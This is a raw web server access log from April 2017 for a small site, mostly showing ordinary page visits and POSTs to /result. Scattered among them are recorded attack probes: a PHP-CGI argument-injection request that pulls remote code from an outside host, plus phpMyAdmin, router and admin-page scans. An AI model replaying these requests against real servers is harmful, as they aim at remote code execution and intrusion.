132.205.229.75 - - [10/Apr/2017:00:50:58 +0000] "GET / HTTP/1.1" 200 2290 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
132.205.229.75 - - [10/Apr/2017:00:50:59 +0000] "GET /favicon.ico HTTP/1.1" 404 1009 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
35.163.12.69 - - [10/Apr/2017:00:51:14 +0000] "POST /result HTTP/1.1" 200 54 "-" "python-requests/2.13.0"
132.205.229.75 - - [10/Apr/2017:00:51:14 +0000] "POST / HTTP/1.1" 200 2337 "http://35.163.12.69/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
132.205.229.75 - - [10/Apr/2017:01:03:11 +0000] "POST /result HTTP/1.1" 500 12711 "-" "Apache-HttpClient/4.5.3 (Java/1.8.0_121)"
132.205.229.75 - - [10/Apr/2017:01:04:28 +0000] "POST /result HTTP/1.1" 200 55 "-" "Apache-HttpClient/4.5.3 (Java/1.8.0_121)"
132.205.229.75 - - [10/Apr/2017:01:05:57 +0000] "POST /result HTTP/1.1" 200 29 "-" "Apache-HttpClient/4.5.3 (Java/1.8.0_121)"
132.205.93.56 - - [10/Apr/2017:01:08:13 +0000] "GET / HTTP/1.1" 200 2288 "-" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.56 - - [10/Apr/2017:01:08:13 +0000] "GET /favicon.ico HTTP/1.1" 404 1009 "-" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
35.163.12.69 - - [10/Apr/2017:01:08:17 +0000] "POST /result HTTP/1.1" 200 54 "-" "python-requests/2.13.0"
132.205.93.56 - - [10/Apr/2017:01:08:17 +0000] "POST / HTTP/1.1" 200 2337 "http://35.163.12.69/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.56 - - [10/Apr/2017:01:08:57 +0000] "GET /contact HTTP/1.1" 301 5 "http://35.163.12.69/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.56 - - [10/Apr/2017:01:08:57 +0000] "GET /contact/ HTTP/1.1" 200 1070 "http://35.163.12.69/" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.229.75 - - [10/Apr/2017:01:25:21 +0000] "POST /result HTTP/1.1" 200 29 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
132.205.229.75 - - [10/Apr/2017:01:34:02 +0000] "POST /result HTTP/1.1" 200 55 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
132.205.229.75 - - [10/Apr/2017:01:36:59 +0000] "POST /result HTTP/1.1" 200 55 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
132.205.229.75 - - [10/Apr/2017:01:38:38 +0000] "POST /result HTTP/1.1" 200 55 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
132.205.229.75 - - [10/Apr/2017:01:39:23 +0000] "POST /result HTTP/1.1" 200 54 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
132.205.229.75 - - [10/Apr/2017:01:44:17 +0000] "POST /result HTTP/1.1" 500 603 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
132.205.229.75 - - [10/Apr/2017:01:45:02 +0000] "POST /result HTTP/1.1" 500 603 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
132.205.229.75 - - [10/Apr/2017:01:46:33 +0000] "POST /result HTTP/1.1" 500 603 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
132.205.229.75 - - [10/Apr/2017:01:47:52 +0000] "POST /result HTTP/1.1" 500 603 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
132.205.93.56 - - [10/Apr/2017:01:48:52 +0000] "GET / HTTP/1.1" 200 2230 "-" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.56 - - [10/Apr/2017:01:48:52 +0000] "GET /favicon.ico HTTP/1.1" 404 1026 "-" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
35.163.12.69 - - [10/Apr/2017:01:48:58 +0000] "POST /result HTTP/1.1" 500 226 "-" "curl/7.35.0"
132.205.93.56 - - [10/Apr/2017:01:50:49 +0000] "GET / HTTP/1.1" 502 181 "-" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.229.75 - - [10/Apr/2017:01:51:03 +0000] "POST /result HTTP/1.1" 500 201 "-" "Apache-HttpClient/4.5.3 (Java/1.8.0_121)"
132.205.229.75 - - [10/Apr/2017:01:52:49 +0000] "POST /result HTTP/1.1" 200 55 "-" "Apache-HttpClient/4.5.3 (Java/1.8.0_121)"
35.163.12.69 - - [10/Apr/2017:01:53:05 +0000] "POST /result HTTP/1.1" 200 79 "-" "curl/7.35.0"
132.205.229.75 - - [10/Apr/2017:01:53:22 +0000] "POST /result HTTP/1.1" 200 54 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
132.205.229.75 - - [10/Apr/2017:01:55:03 +0000] "POST /result HTTP/1.1" 200 54 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
132.205.229.75 - - [10/Apr/2017:01:56:25 +0000] "POST /result HTTP/1.1" 200 54 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
132.205.229.75 - - [10/Apr/2017:01:57:04 +0000] "POST /result HTTP/1.1" 200 29 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
132.205.229.75 - - [10/Apr/2017:01:57:29 +0000] "POST /result HTTP/1.1" 200 54 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
132.205.229.75 - - [10/Apr/2017:02:01:55 +0000] "POST /result HTTP/1.1" 200 29 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
132.205.229.75 - - [10/Apr/2017:02:13:49 +0000] "POST /result HTTP/1.1" 200 29 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
132.205.229.75 - - [10/Apr/2017:02:16:14 +0000] "POST /result HTTP/1.1" 200 29 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
132.205.229.75 - - [10/Apr/2017:02:19:47 +0000] "POST /result HTTP/1.1" 200 54 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
132.205.229.75 - - [10/Apr/2017:02:21:40 +0000] "POST /result HTTP/1.1" 200 54 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
132.205.229.75 - - [10/Apr/2017:02:23:44 +0000] "POST /result HTTP/1.1" 200 54 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
132.205.229.75 - - [10/Apr/2017:02:25:06 +0000] "POST /result HTTP/1.1" 502 181 "-" "Apache-HttpClient/4.5.3 (Java/1.8.0_121)"
35.163.12.69 - - [10/Apr/2017:02:25:37 +0000] "POST /result HTTP/1.1" 502 206 "-" "curl/7.35.0"
132.205.93.56 - - [10/Apr/2017:02:32:34 +0000] "GET / HTTP/1.1" 200 2289 "-" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.93.56 - - [10/Apr/2017:02:32:52 +0000] "GET / HTTP/1.1" 200 2291 "-" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
35.163.12.69 - - [10/Apr/2017:02:33:15 +0000] "POST /result HTTP/1.1" 499 25 "-" "curl/7.35.0"
132.205.93.56 - - [10/Apr/2017:02:36:19 +0000] "GET / HTTP/1.1" 200 2234 "-" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
35.163.12.69 - - [10/Apr/2017:02:36:28 +0000] "POST /result HTTP/1.1" 200 79 "-" "curl/7.35.0"
35.163.12.69 - - [10/Apr/2017:02:36:40 +0000] "POST /result HTTP/1.1" 200 79 "-" "curl/7.35.0"
35.163.12.69 - - [10/Apr/2017:02:36:43 +0000] "POST /result HTTP/1.1" 200 79 "-" "curl/7.35.0"
35.163.12.69 - - [10/Apr/2017:02:36:51 +0000] "POST /result HTTP/1.1" 200 79 "-" "curl/7.35.0"
35.163.12.69 - - [10/Apr/2017:02:38:40 +0000] "POST /result HTTP/1.1" 200 79 "-" "curl/7.35.0"
188.36.250.14 - - [10/Apr/2017:05:30:21 +0000] "GET / HTTP/1.1" 200 5716 "-" "curl/7.17.1 (mips-unknown-linux-gnu) libcurl/7.17.1 OpenSSL/0.9.8i zlib/1.2.3"
185.69.69.72 - - [10/Apr/2017:07:48:19 +0000] "GET / HTTP/1.1" 200 5716 "-" "curl/7.17.1 (mips-unknown-linux-gnu) libcurl/7.17.1 OpenSSL/0.9.8i zlib/1.2.3"
139.162.124.167 - - [10/Apr/2017:08:03:03 +0000] "GET / HTTP/1.1" 200 2288 "-" "Mozilla/5.0"
66.240.205.34 - - [10/Apr/2017:09:01:51 +0000] "myversion|3.6 Public" 400 181 "-" "-"
192.186.9.140 - - [10/Apr/2017:09:11:43 +0000] "GET / HTTP/1.1" 200 2230 "-" "python-requests/2.13.0"
185.27.217.34 - - [10/Apr/2017:10:29:35 +0000] "GET / HTTP/1.1" 200 5716 "-" "curl/7.17.1 (mips-unknown-linux-gnu) libcurl/7.17.1 OpenSSL/0.9.8i zlib/1.2.3"
103.54.45.4 - - [10/Apr/2017:11:47:27 +0000] "GET /plugins/weathermap/editor.php HTTP/1.1" 404 1042 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:43.0) Gecko/20100101 Firefox/43.0"
185.69.69.80 - - [10/Apr/2017:13:34:44 +0000] "GET / HTTP/1.1" 200 5716 "-" "curl/7.17.1 (mips-unknown-linux-gnu) libcurl/7.17.1 OpenSSL/0.9.8i zlib/1.2.3"
139.162.66.65 - - [10/Apr/2017:14:19:18 +0000] "GET / HTTP/1.1" 200 2235 "-" "Mozilla/5.0"
69.70.216.122 - - [10/Apr/2017:14:25:11 +0000] "POST /result HTTP/1.1" 502 181 "-" "Apache-HttpClient/4.5.3 (Java/1.8.0_121)"
151.54.154.62 - - [10/Apr/2017:14:58:42 +0000] "GET / HTTP/1.0" 200 5538 "-" "-"
185.27.217.34 - - [10/Apr/2017:18:47:01 +0000] "GET / HTTP/1.1" 200 5716 "-" "curl/7.17.1 (mips-unknown-linux-gnu) libcurl/7.17.1 OpenSSL/0.9.8i zlib/1.2.3"
188.36.250.14 - - [10/Apr/2017:19:34:55 +0000] "GET / HTTP/1.1" 200 5716 "-" "curl/7.17.1 (mips-unknown-linux-gnu) libcurl/7.17.1 OpenSSL/0.9.8i zlib/1.2.3"
103.54.45.4 - - [10/Apr/2017:19:54:24 +0000] "GET /plugins/weathermap/editor.php HTTP/1.1" 404 1025 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:43.0) Gecko/20100101 Firefox/43.0"
191.96.249.97 - - [10/Apr/2017:21:23:49 +0000] "GET /cgi-bin/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D\x22\x22+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://191.96.249.97/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n HTTP/1.1" 404 2834 "-" "-"
192.186.9.140 - - [10/Apr/2017:21:47:59 +0000] "GET / HTTP/1.1" 200 2285 "-" "python-requests/2.13.0"
24.114.84.196 - - [11/Apr/2017:02:39:26 +0000] "GET / HTTP/1.1" 200 2286 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"
24.114.84.196 - - [11/Apr/2017:02:39:27 +0000] "GET /static/js/recorder.js HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"
24.114.84.196 - - [11/Apr/2017:02:39:27 +0000] "GET /static/js/record_mic.js HTTP/1.1" 200 278 "http://35.163.12.69/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"
24.114.84.196 - - [11/Apr/2017:02:39:27 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"
24.114.84.196 - - [11/Apr/2017:02:39:27 +0000] "GET /static/js/jquery-1.11.2.js HTTP/1.1" 200 284184 "http://35.163.12.69/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"
35.163.12.69 - - [11/Apr/2017:02:39:51 +0000] "POST /result HTTP/1.1" 200 54 "-" "python-requests/2.13.0"
24.114.84.196 - - [11/Apr/2017:02:39:51 +0000] "POST / HTTP/1.1" 200 2337 "http://35.163.12.69/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"
59.188.239.77 - - [11/Apr/2017:03:40:20 +0000] "POST /goform/setLan HTTP/1.1" 404 1031 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"
59.188.239.77 - - [11/Apr/2017:03:40:21 +0000] "" 400 0 "-" "-"
191.96.249.97 - - [11/Apr/2017:03:43:10 +0000] "GET /cgi-bin/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D\x22\x22+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://191.96.249.97/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n HTTP/1.1" 404 2834 "-" "-"
58.225.75.151 - - [11/Apr/2017:04:12:00 +0000] "GET //myadmin/scripts/setup.php HTTP/1.1" 404 1019 "-" "-"
58.225.75.151 - - [11/Apr/2017:04:12:00 +0000] "GET //pma/scripts/setup.php HTTP/1.1" 404 1018 "-" "-"
58.225.75.151 - - [11/Apr/2017:04:12:00 +0000] "GET //phpMyAdmin/scripts/setup.php HTTP/1.1" 404 1023 "-" "-"
58.225.75.151 - - [11/Apr/2017:04:12:00 +0000] "GET //MyAdmin/scripts/setup.php HTTP/1.1" 404 1021 "-" "-"
58.225.75.151 - - [11/Apr/2017:04:12:00 +0000] "GET //phpmyadmin/scripts/setup.php HTTP/1.1" 404 1022 "-" "-"
58.225.75.151 - - [11/Apr/2017:04:12:00 +0000] "GET /muieblackcat HTTP/1.1" 404 1009 "-" "-"
212.237.10.71 - - [11/Apr/2017:05:15:15 +0000] "GET /muieblackcat HTTP/1.1" 404 1009 "-" "-"
212.237.10.71 - - [11/Apr/2017:05:15:15 +0000] "GET //myadmin/scripts/setup.php HTTP/1.1" 404 1019 "-" "-"
212.237.10.71 - - [11/Apr/2017:05:15:15 +0000] "GET //MyAdmin/scripts/setup.php HTTP/1.1" 404 1021 "-" "-"
212.237.10.71 - - [11/Apr/2017:05:15:15 +0000] "GET //phpMyAdmin/scripts/setup.php HTTP/1.1" 404 1023 "-" "-"
212.237.10.71 - - [11/Apr/2017:05:15:15 +0000] "GET //phpmyadmin/scripts/setup.php HTTP/1.1" 404 1022 "-" "-"
212.237.10.71 - - [11/Apr/2017:05:15:15 +0000] "GET //pma/scripts/setup.php HTTP/1.1" 404 1018 "-" "-"
54.91.164.205 - - [11/Apr/2017:05:38:20 +0000] "GET / HTTP/1.1" 200 2286 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
183.129.160.229 - - [11/Apr/2017:09:52:24 +0000] "GET / HTTP/1.1" 200 5716 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
183.129.160.229 - - [11/Apr/2017:09:52:25 +0000] "GET /map_ports.html HTTP/1.1" 404 2581 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
188.36.250.14 - - [11/Apr/2017:10:17:15 +0000] "GET / HTTP/1.1" 200 5716 "-" "curl/7.17.1 (mips-unknown-linux-gnu) libcurl/7.17.1 OpenSSL/0.9.8i zlib/1.2.3"
69.197.179.2 - - [11/Apr/2017:11:14:01 +0000] "OPTIONS / HTTP/1.1" 200 179 "-" "-"
185.27.217.34 - - [11/Apr/2017:11:53:53 +0000] "GET / HTTP/1.1" 200 5716 "-" "curl/7.17.1 (mips-unknown-linux-gnu) libcurl/7.17.1 OpenSSL/0.9.8i zlib/1.2.3"
209.126.136.5 - - [11/Apr/2017:13:02:53 +0000] "GET / HTTP/1.1" 200 2287 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
203.217.21.93 - - [11/Apr/2017:13:25:17 +0000] "GET / HTTP/1.0" 200 5538 "-" "-"
23.91.241.182 - - [11/Apr/2017:14:49:48 +0000] "GET / HTTP/1.1" 200 2287 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"
35.163.12.69 - - [11/Apr/2017:14:50:05 +0000] "POST /result HTTP/1.1" 200 54 "-" "python-requests/2.13.0"
23.91.241.182 - - [11/Apr/2017:14:50:19 +0000] "POST / HTTP/1.1" 499 0 "http://35.163.12.69/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"
23.91.241.182 - - [11/Apr/2017:14:50:20 +0000] "POST / HTTP/1.1" 499 0 "http://35.163.12.69/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"
23.91.241.182 - - [11/Apr/2017:14:50:22 +0000] "POST / HTTP/1.1" 499 0 "http://35.163.12.69/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"
23.91.241.182 - - [11/Apr/2017:14:50:22 +0000] "POST / HTTP/1.1" 499 0 "http://35.163.12.69/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"
35.163.12.69 - - [11/Apr/2017:14:50:30 +0000] "POST /result HTTP/1.1" 200 54 "-" "python-requests/2.13.0"
35.163.12.69 - - [11/Apr/2017:14:50:33 +0000] "POST /result HTTP/1.1" 200 54 "-" "python-requests/2.13.0"
35.163.12.69 - - [11/Apr/2017:14:50:35 +0000] "POST /result HTTP/1.1" 200 54 "-" "python-requests/2.13.0"
35.163.12.69 - - [11/Apr/2017:14:50:38 +0000] "POST /result HTTP/1.1" 200 54 "-" "python-requests/2.13.0"
23.91.241.182 - - [11/Apr/2017:14:50:38 +0000] "POST / HTTP/1.1" 200 2337 "http://35.163.12.69/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"
35.163.12.69 - - [11/Apr/2017:14:51:00 +0000] "POST /result HTTP/1.1" 200 54 "-" "python-requests/2.13.0"
23.91.241.182 - - [11/Apr/2017:14:51:01 +0000] "POST / HTTP/1.1" 200 2337 "http://35.163.12.69/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"
123.56.218.29 - - [11/Apr/2017:16:32:09 +0000] "GET /MyAdmin/scripts/setup.php HTTP/1.1" 404 1021 "-" "ByZr"
123.56.218.29 - - [11/Apr/2017:16:32:09 +0000] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 404 1031 "-" "ByZr"
123.56.218.29 - - [11/Apr/2017:16:32:09 +0000] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 1023 "-" "ByZr"
123.56.218.29 - - [11/Apr/2017:16:32:09 +0000] "GET /myadmin/scripts/setup.php HTTP/1.1" 404 1019 "-" "ByZr"
123.56.218.29 - - [11/Apr/2017:16:32:09 +0000] "GET /pma/scripts/setup.php HTTP/1.1" 404 1018 "-" "ByZr"
123.56.218.29 - - [11/Apr/2017:16:32:09 +0000] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 1022 "-" "ByZr"
23.91.241.182 - - [11/Apr/2017:18:22:07 +0000] "GET / HTTP/1.1" 200 2290 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [11/Apr/2017:18:22:07 +0000] "GET /static/js/recorder.js HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [11/Apr/2017:18:22:07 +0000] "GET /static/js/record_mic.js HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [11/Apr/2017:18:22:07 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [11/Apr/2017:18:22:07 +0000] "GET /static/js/jquery-1.11.2.js HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [11/Apr/2017:18:22:07 +0000] "GET /favicon.ico HTTP/1.1" 404 1009 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
35.163.12.69 - - [11/Apr/2017:18:22:16 +0000] "POST /result HTTP/1.1" 200 54 "-" "python-requests/2.13.0"
23.91.241.182 - - [11/Apr/2017:18:22:17 +0000] "POST / HTTP/1.1" 200 2337 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [11/Apr/2017:18:23:24 +0000] "GET / HTTP/1.1" 200 2289 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
35.163.12.69 - - [11/Apr/2017:18:23:28 +0000] "POST /result HTTP/1.1" 200 54 "-" "python-requests/2.13.0"
23.91.241.182 - - [11/Apr/2017:18:23:28 +0000] "POST / HTTP/1.1" 200 2337 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
35.163.12.69 - - [11/Apr/2017:18:23:33 +0000] "POST /result HTTP/1.1" 200 54 "-" "python-requests/2.13.0"
23.91.241.182 - - [11/Apr/2017:18:23:33 +0000] "POST / HTTP/1.1" 200 2337 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
35.163.12.69 - - [11/Apr/2017:18:23:37 +0000] "POST /result HTTP/1.1" 200 54 "-" "python-requests/2.13.0"
23.91.241.182 - - [11/Apr/2017:18:23:37 +0000] "POST / HTTP/1.1" 200 2337 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
185.27.217.34 - - [11/Apr/2017:18:57:33 +0000] "GET / HTTP/1.1" 200 5716 "-" "curl/7.17.1 (mips-unknown-linux-gnu) libcurl/7.17.1 OpenSSL/0.9.8i zlib/1.2.3"
51.15.6.171 - - [11/Apr/2017:19:23:23 +0000] "GET /CFIDE/administrator/ HTTP/1.1" 404 2599 "-" "-"
23.91.241.182 - - [11/Apr/2017:20:41:45 +0000] "GET / HTTP/1.1" 200 2292 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"
35.163.12.69 - - [11/Apr/2017:20:41:49 +0000] "POST /result HTTP/1.1" 200 54 "-" "python-requests/2.13.0"
23.91.241.182 - - [11/Apr/2017:20:41:50 +0000] "POST / HTTP/1.1" 200 2337 "http://35.163.12.69/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"
195.154.17.225 - - [11/Apr/2017:21:10:51 +0000] "GET //phpmyadmin/scripts/setup.php HTTP/1.1" 404 1022 "-" "-"
23.91.241.182 - - [11/Apr/2017:21:25:23 +0000] "GET / HTTP/1.1" 200 2287 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
35.163.12.69 - - [11/Apr/2017:21:26:17 +0000] "POST /result HTTP/1.1" 200 29 "-" "python-requests/2.13.0"
23.91.241.182 - - [11/Apr/2017:21:26:17 +0000] "POST / HTTP/1.1" 200 2264 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [11/Apr/2017:21:26:38 +0000] "GET / HTTP/1.1" 200 2288 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
141.212.122.64 - - [11/Apr/2017:23:29:04 +0000] "GET / HTTP/1.1" 200 2288 "-" "Mozilla/5.0 zgrab/0.x"
188.36.250.14 - - [12/Apr/2017:00:37:51 +0000] "GET / HTTP/1.1" 200 5716 "-" "curl/7.17.1 (mips-unknown-linux-gnu) libcurl/7.17.1 OpenSSL/0.9.8i zlib/1.2.3"
192.222.220.68 - - [12/Apr/2017:06:11:07 +0000] "POST /result HTTP/1.1" 200 53 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1"
192.222.220.68 - - [12/Apr/2017:06:11:46 +0000] "POST /result HTTP/1.1" 200 67 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
